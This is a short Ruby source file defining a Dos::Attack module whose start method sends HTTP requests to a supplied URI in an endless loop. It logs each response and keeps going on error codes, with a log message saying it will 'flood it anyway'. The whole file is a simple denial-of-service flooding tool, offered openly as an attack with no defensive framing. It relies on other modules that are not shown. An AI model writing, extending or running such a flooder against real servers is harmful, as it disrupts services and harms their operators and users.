module Dos
  module Attack
    module_function

    def start(uri = nil, method = :get)
      loop do
        begin
          response = Faraday.public_send(method, uri)
          if response.status == 200
            Dos::ProcessAttack.handle(response) do |r|
              Dos::Logger.log(r.status)
            end
          else
            Dos::ProcessAttack.handle(response) do |r|
              Dos::Logger.log("The server responded with status code #{r.status} but we are going to flood it anyway")
            end
          end
        rescue Faraday::ConnectionFailed => e
          raise Dos::ConnectionFailedError, e.message
        end
      end
    end
  end
end
